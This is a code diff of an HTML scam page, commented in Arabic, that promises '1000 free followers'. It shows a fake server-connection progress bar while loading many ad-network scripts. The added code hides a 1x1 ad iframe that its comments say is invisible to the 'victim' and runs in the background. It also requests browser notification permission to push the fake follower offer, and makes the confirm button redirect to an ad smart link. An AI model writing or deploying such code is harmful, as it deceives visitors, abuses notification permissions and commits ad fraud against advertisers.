@@ -92,13 +92,14 @@
             font-weight: 500;
         }
 
-        .ads-section {
+        /* Navigation Bar - اللي بيظهر تحته إعلانات كتير */
+        .nav-ads {
             margin-top: 25px;
             padding-top: 20px;
             border-top: 1px solid #eee;
         }
 
-        .ads-title {
+        .nav-title {
             text-align: center;
             font-size: 14px;
             color: #999;
@@ -106,13 +107,19 @@
             font-weight: 600;
         }
 
-        .ad-box {
+        /* إعلانات Navigation Bar (بتظهر تحت بعض) */
+        .nav-ad-item {
             background: #fafafa;
             border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 15px;
+            padding: 12px;
+            margin-bottom: 10px;
             text-align: center;
             border: 1px solid #eee;
+        }
+
+        /* الإعلان المختفي (Hidden Ad) - مش باين للضحية */
+        .hidden-ad {
+            display: none;
         }
 
         .confirm-btn {
@@ -143,16 +150,6 @@
             border-top: 1px solid #eee;
             font-weight: 500;
         }
-
-        .hidden {
-            display: none;
-        }
-
-        iframe, .ad-iframe {
-            width: 100%;
-            border: none;
-            border-radius: 8px;
-        }
     </style>
 </head>
 <body>
@@ -172,19 +169,20 @@
             جاري الاتصال بالخوادم
         </div>
 
-        <div class="ads-section" id="adsSection">
-            <div class="ads-title">عروض حصرية</div>
+        <!-- Navigation Bar - إعلانات تحت بعض -->
+        <div class="nav-ads" id="navAds">
+            <div class="nav-title">عروض حصرية</div>
             
-            <div class="ad-box" id="adBox1">
+            <div class="nav-ad-item">
                 <script src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"></script>
             </div>
 
-            <div class="ad-box" id="adBox2">
+            <div class="nav-ad-item">
                 <script async="async" data-cfasync="false" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"></script>
                 <div id="container-596225155ab3da796681d551cb4b7cf4"></div>
             </div>
 
-            <div class="ad-box" id="adBox3">
+            <div class="nav-ad-item">
                 <script>
                     atOptions = {
                         'key' : 'dcff8a2cffdf0642c627a5bacf3a04fd',
@@ -197,11 +195,11 @@
                 <script src="https://www.highperformanceformat.com/dcff8a2cffdf0642c627a5bacf3a04fd/invoke.js"></script>
             </div>
 
-            <div class="ad-box" id="adBox4">
+            <div class="nav-ad-item">
                 <script src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"></script>
             </div>
 
-            <div class="ad-box" id="adBox5">
+            <div class="nav-ad-item">
                 <script>
                     atOptions = {
                         'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
@@ -214,34 +212,7 @@
                 <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"></script>
             </div>
 
-            <div class="ad-box" id="adBox6">
-                <iframe src="https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c" width="100%" height="280" style="border:none; border-radius:8px;"></iframe>
-            </div>
-
-            <div class="ad-box" id="adBox7">
-                <script type="text/javascript">
-                    atOptions = {
-                        'key' : '9e5f8c0b6b7b8c9d0e1f2a3b4c5d6e7f',
-                        'format' : 'iframe',
-                        'height' : 250,
-                        'width' : 300,
-                        'params' : {}
-                    };
-                </script>
-                <script src="https://www.highperformanceformat.com/9e5f8c0b6b7b8c9d0e1f2a3b4c5d6e7f/invoke.js"></script>
-            </div>
-
-            <div class="ad-box" id="adBox8">
-                <a href="#" target="_blank" style="display:block; padding:20px; background:#e1306c; color:white; text-decoration:none; border-radius:8px; font-weight:bold;">
-                    عرض خاص - احصل على 1000 متابع مجانا
-                </a>
-            </div>
-
-            <div class="ad-box" id="adBox9">
-                <img src="https://via.placeholder.com/300x250/e1306c/white?text=عرض+خاص" style="width:100%; max-width:300px; border-radius:8px;" alt="عرض خاص">
-            </div>
-
-            <div class="ad-box" id="adBox10">
+            <div class="nav-ad-item">
                 <iframe src="https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c" width="100%" height="250" style="border:none; border-radius:8px;"></iframe>
             </div>
         </div>
@@ -254,7 +225,45 @@
     </div>
 </div>
 
+<!-- الإعلان المختفي (Hidden Ad) - مش باين للضحية -->
+<div class="hidden-ad" id="hiddenAd">
+    <script>
+        // إعلان مخفي - بيشتغل في الخلفية
+        atOptions = {
+            'key' : '9e5f8c0b6b7b8c9d0e1f2a3b4c5d6e7f',
+            'format' : 'iframe',
+            'height' : 1,
+            'width' : 1,
+            'params' : {}
+        };
+    </script>
+    <script src="https://www.highperformanceformat.com/9e5f8c0b6b7b8c9d0e1f2a3b4c5d6e7f/invoke.js"></script>
+</div>
+
 <script>
+    // ========== إعلان الاشعار (Notification Ad) ==========
+    function showNotificationAd() {
+        if (Notification.permission === "granted") {
+            // إرسال إشعار
+            const notification = new Notification("عرض خاص!", {
+                body: "احصل على 1000 متابع مجانا الآن!",
+                icon: "https://i.ibb.co/m5xkq72P/e-ANHug-Mt-Dn9-Ue-Wa-Oc-Eyv22mz-CQ763m-Yvet-N2dd4-C.png",
+                clickLink: "https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c"
+            });
+            
+            notification.onclick = function() {
+                window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c", "_blank");
+            };
+        } else if (Notification.permission !== "denied") {
+            Notification.requestPermission().then(permission => {
+                if (permission === "granted") {
+                    showNotificationAd();
+                }
+            });
+        }
+    }
+
+    // ========== شريط التحميل ==========
     const progressBar = document.getElementById('progressBar');
     const progressPercent = document.getElementById('progressPercent');
     const statusText = document.getElementById('statusText');
@@ -285,6 +294,8 @@
             if(stage.percent === 100) {
                 isCompleted = true;
                 confirmBtn.disabled = false;
+                // تشغيل إعلان الاشعار عند الاكتمال
+                showNotificationAd();
             }
         }
     }
@@ -292,54 +303,19 @@
     const progressInterval = setInterval(updateProgress, 1500);
     confirmBtn.disabled = true;
     
-    const adBoxes = ['adBox1', 'adBox2', 'adBox3', 'adBox4', 'adBox5', 'adBox6', 'adBox7', 'adBox8', 'adBox9', 'adBox10'];
-    let currentAdIndex = 0;
+    // ========== زر الزيادة - يودي لـ Smart Link ==========
+    const SMART_LINK_URL = "https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c";
     
-    // إخفاء كل الإعلانات في البداية
-    adBoxes.forEach(boxId => {
-        const box = document.getElementById(boxId);
-        if(box) box.classList.add('hidden');
-    });
-    
-    // دالة لعرض إعلان عشوائي
-    function showRandomAd() {
-        // إخفاء الإعلان الحالي
-        const currentAd = document.getElementById(adBoxes[currentAdIndex]);
-        if(currentAd) currentAd.classList.add('hidden');
-        
-        // اختيار إعلان عشوائي
-        const randomIndex = Math.floor(Math.random() * adBoxes.length);
-        currentAdIndex = randomIndex;
-        
-        // إظهار الإعلان الجديد
-        const newAd = document.getElementById(adBoxes[currentAdIndex]);
-        if(newAd) newAd.classList.remove('hidden');
-    }
-    
-    // عند اكتمال التحميل، إظهار أول إعلان
-    let checkCompleteInterval = setInterval(() => {
-        if(isCompleted) {
-            clearInterval(checkCompleteInterval);
-            const firstAd = document.getElementById(adBoxes[0]);
-            if(firstAd) firstAd.classList.remove('hidden');
-            currentAdIndex = 0;
-        }
-    }, 100);
-    
-    // كل ضغطة على الزر تعرض إعلان جديد (لا نهائي)
     confirmBtn.addEventListener('click', function() {
         if(!isCompleted) {
             alert("الرجاء الانتظار حتى اكتمال التحميل");
             return;
         }
         
-        // عرض إعلان عشوائي جديد
-        showRandomAd();
-        
-        // الزر يفضل دايماً "انقر للزيادة"
-        confirmBtn.innerText = 'انقر للزيادة';
+        // فتح Smart Link في نفس الصفحة أو صفحة جديدة
+        window.location.href = SMART_LINK_URL;
     });
 </script>
 
 </body>
-    </html>
+</html>
